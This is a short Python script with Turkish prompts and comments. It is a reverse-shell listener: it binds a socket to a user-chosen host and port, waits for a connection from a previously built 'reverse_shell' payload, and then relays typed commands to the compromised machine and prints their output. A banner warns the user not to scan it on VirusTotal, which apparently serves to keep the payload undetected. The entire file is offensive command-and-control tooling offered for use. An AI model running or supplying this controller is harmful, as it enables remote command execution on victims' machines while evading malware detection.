# coding=utf-8
# ©xyxalpha - tht

import socket
import time
import datetime
from time import sleep
from colorama import Fore, Back, Style
#olusturulen reverse_shell dinleme
print("\n")
print("EXAMPLE: RHOST/dinlenecek ag ----- RPORT/dinlenecek port")
print("------------------------------------")
print(Fore.GREEN+"[!] OLUŞTURDUGUNUZ 'reverse_shell'DE GİRİLEN BİLGİLERİ GİRİNİZ")
print("------------------------------------")
print(Fore.RED+"[!] VİRUS TOTALDE TARAMA YAPMAYINIZ")
print("------------------------------------")
rhost = input(Fore.YELLOW+">>>[+]RHOST GİRİNİZ: ")
rport = int(input(Fore.YELLOW+">>>[+]RPORT GİRİNİZ: "))

sleep(2)
print("\n")

print(Fore.BLUE+">>[%]reverse_shell dinleniyor... / baglantı bekleniyor...-")


host = rhost
port = rport
soket = socket.socket()
soket.bind((host,port))
soket.listen()
conn, addr = soket.accept()
print(Fore.GREEN+"BAGLANTI SAGLANDI:",str(conn))
mesaj = "BAGLANTI SAGLANDI".encode()
conn.send(mesaj)

while True:

    komut = input("KOMUT:")
    conn.send(komut.encode())
    if komut.lower() == "exit":
        break
    sonuc = conn.recv(1024).decode()
    print(sonuc)

conn.close()
soket.close()
